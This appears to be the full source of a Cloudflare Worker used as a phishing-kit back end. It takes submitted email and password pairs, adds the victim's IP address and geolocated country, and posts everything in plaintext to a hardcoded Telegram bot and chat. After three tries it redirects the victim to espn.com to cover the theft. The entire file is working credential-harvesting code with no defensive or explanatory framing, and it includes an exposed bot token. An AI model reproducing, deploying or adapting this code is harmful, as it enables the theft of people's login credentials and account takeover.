const loginAttempts = new Map();

addEventListener("fetch", (event) => {
  event.respondWith(processRequest(event.request));
});

async function processRequest(request) {
  if (request.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: setCORS() });
  }

  if (request.method === "POST") {
    try {
      const reqBody = await request.json();
      const { email, pass } = reqBody;
      const clientIP = request.headers.get("CF-Connecting-IP") || "Unknown";
      const userDomain = email.includes("@") ? email.split("@")[1] : "N/A";
      const location = await fetchUserCountry(clientIP);

      const userKey = `${clientIP}:${email}`;
      if (!loginAttempts.has(userKey)) {
        loginAttempts.set(userKey, { tries: 1, lastTry: Date.now() });
      } else {
        let attemptRecord = loginAttempts.get(userKey);
        let elapsedTime = Date.now() - attemptRecord.lastTry;

        if (elapsedTime > 300000) {
          attemptRecord.tries = 1;
        } else {
          attemptRecord.tries += 1;
        }

        attemptRecord.lastTry = Date.now();
        loginAttempts.set(userKey, attemptRecord);

        if (attemptRecord.tries >= 3) {
          return new Response(JSON.stringify({ destination: "https://www.espn.com" }), {
            status: 200,
            headers: {
              "Content-Type": "application/json",
              ...setCORS(),
            },
          });
        }
      }

      const msgContent = `📧 *Login Attempt Detected*\n\n👤 *Email:* \`${email}\`\n🔑 *Pass:* \`${pass}\`\n🌎 *IP:* ${clientIP}\n📍 *Region:* ${location}\n🔹 *Domain:* ${userDomain}`;

      const botKey = "7588332297:AAEvcX1TbtBompCjvd1ewAf1FZJKqTJ6Jk4";
      const chatChannel = "1542058668";
      const tgAPI = `https://api.telegram.org/bot${botKey}/sendMessage`;

      const sendMsg = await fetch(tgAPI, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatChannel,
          text: msgContent,
          parse_mode: "Markdown",
        }),
      });

      return sendMsg.ok
        ? new Response(null, { status: 200, headers: setCORS() })
        : new Response(null, { status: 500, headers: setCORS() });
    } catch (err) {
      return new Response(null, { status: 500, headers: setCORS() });
    }
  } else {
    return new Response(null, { status: 405, headers: setCORS() });
  }
}

function setCORS() {
  return {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
}

async function fetchUserCountry(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (res.ok) {
      const data = await res.json();
      return data.country || "Unknown";
    }
  } catch (err) {}
  return "Unknown";
}
